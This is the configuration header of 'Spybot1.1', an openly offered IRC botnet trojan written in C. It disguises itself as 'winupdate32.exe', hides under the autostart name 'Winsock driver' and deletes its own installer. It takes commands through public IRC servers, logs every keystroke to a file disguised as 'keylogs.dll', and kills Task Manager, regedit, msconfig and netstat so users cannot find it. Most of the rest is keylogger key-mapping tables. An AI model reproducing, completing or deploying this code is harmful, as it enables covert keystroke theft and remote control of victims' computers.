//////////////////////////////////////////////////////////
//							//
//		Spybot1.1 by Mich			//
//							//
//		Opensource irc bot 			//
//							//
//	    IRC: irc.babbels.com #dreams		//
//							//
//	 You can use this code however      		//
//       you want, as long as i'm given     		//
//       credit in some way.				//
//	 This is the first real c program i have        //
//	 made so there will be some bugs in it.         //
//	    						//
//		use at your own risk.			//
//							//
//	       Good luck and have fun!			//
//							//
//////////////////////////////////////////////////////////
       

///////////////////bots settings//////////////////////////


char filename[] = "winupdate32.exe"; //bots filename 
char password[] = "password"; //bots password
char channel[] = "#spybot1.1"; //channel bot joins on connect
char channelpass[] = "trojanforge"; //password of the channel
const int maxlogins = 3; // maximum number of logins
char valuename[] = "Winsock driver"; //autostart key
int decryptkey = 83; //decrypt key (see the readme file)
char mutexname[] = "spybot1.1"; //just enter somthing ;-)
BOOL meltserver = TRUE; //if TRUE delete server after install
BOOL topiccommands = TRUE; //enable topic commands

int num_of_servers = 3; //MUST be the same as the number of servers in your list!
char *ircservers[]={
	"eu.undernet.org",
	"irc.icq.com",
	"eu.rr.efnet.net",
};

//number of ports MUST be the same as the number of servers you use, 
//it tryes to connect to the first server in your list using the first port in your list if it can't connect it tryes the next

int serverports[]={ 
	6667,
	6667,
	6667,
};


int logging = 1; //when 1 all keys are logged to systemdir\keylogfilename (online and offline keys), when 0 no keys are logged you can only use the online keylogger
char keylogfilename[] = "keylogs.dll"; 


//rawcommands the bot will send these commands to the ircserver after a connection if you use the word $NICK it will be replaced with de bot's current nick (case sensitive)

int num_of_rawcommands = 1; //MUST be the same as the number of rawcommands (set to 0 if you dont want to use this)


char *rawcommands[]={ 
	"MODE $NICK +i",//if you dont want to use this set num_of_rawcommands to 0 and set a emty line here like "", 

};

//onjoincommands the bot will send these commands to the ircserver after it has joined a channel if you use the word $CHAN it will be replaced with the channel it joins (case sensitive)

int num_of_onjoincommands = 2; //MUST be the same as the number of onjoin_commands (set to 0 if you dont want to use this) 

char *onjoin_commands[]={ //if you dont want to use this set num_of_onjoincommands to 0 and set a emty line here like "",
	"MODE $CHAN +nts",
	"MODE $CHAN +k trojanforge",
};

//bot will check if the hostname is in the list when logging in 
//you can use wildcard's "*" only at the begin or the end of the hostname and only 1
//examples:
// 127.0.0.* matches 127.0.0.1 and 127.0.0.1111 and 127.0.0.1.1.1.1.1 etc.
// *.my.host.com matches 123.my.host.com and 1.my.host.com and this.is.my.host.com

//Test on al the servers you have given witch hostmask the use, some hide your ip address and sometimes the cant resolve your ip  

int num_of_trustedhostnames = 0; //MUST be the number of trustedhosts you add (set to 0 if you dont want to use hostname match)

//add the trustedhosts here 
char *trustedhosts[]={ 
	"my.hostname.com",
};

// AVS/Firewall killer

int nummer_of_av_firewalls_to_kill = 4; //MUST be the number of firewall/AVS you have add to the list (set to 0 if you dont want to use the firewall killer) 
int killer_delay = 2000;

//ALL filenames must be in uppercase!

char *kill_list[]={
	"REGEDIT.EXE",
	"MSCONFIG.EXE",
	"TASKMGR.EXE",
	"NETSTAT.EXE", 
};



/////////////////// end bots settings//////////////////////////


//dont change this its for the keylogger and the sendkeys function
int inputL[]={
	8,
	13,
	27,
	112,
	113,
	114,
	115,
	116,
	117,
	118,
	119,
	120,
	121,
	122,
	123,
	192,
	49,
	50,
	51,
	52,
	53,
	54,
	55,
	56,
	57,
	48,
	189,
	187,
	9,
	81,
	87,
	69,
	82,
	84,
	89,
	85,
	73,
	79,
	80,
	219,
	221,
	65,
	83,
	68,
	70,
	71,
	72,
	74,
	75,
	76,
	186,
	222,
	90,
	88,
	67,
	86,
	66,
	78,
	77,
	188,
	190,
	191,
	220,
	17,
	91,
	32,
	92,
	44,
	145,
	45,
	36,
	33,
	46,
	35,
	34,
	37,
	38,
	39,
	40,
	144,
	111,
	106,
	109,
	107,
	96,
	97,
	98,
	99,
	100,
	101,
	102,
	103,
	104,
	105,
	110,
};

char *outputL[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"`",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[TAB]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"\\",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
}; 




char *outputH[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"~",
	"!",
	"@",
	"#",
	"$",
	"%",
	"^",
	"&",
	"*",
	"(",
	")",
	"_",
	"+",
	"[TAB]",
	"Q",
	"W",
	"E",
	"R",
	"T",
	"Y",
	"U",
	"I",
	"O",
	"P",
	"{",
	"}",
	"A",
	"S",
	"D",
	"F",
	"G",
	"H",
	"J",
	"K",
	"L",
	":",
	"\"",
	"Z",
	"X",
	"C",
	"V",
	"B",
	"N",
	"M",
	"<",
	">",
	"?",//strange ?? dont know why but only a ? did not work
	"|",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
};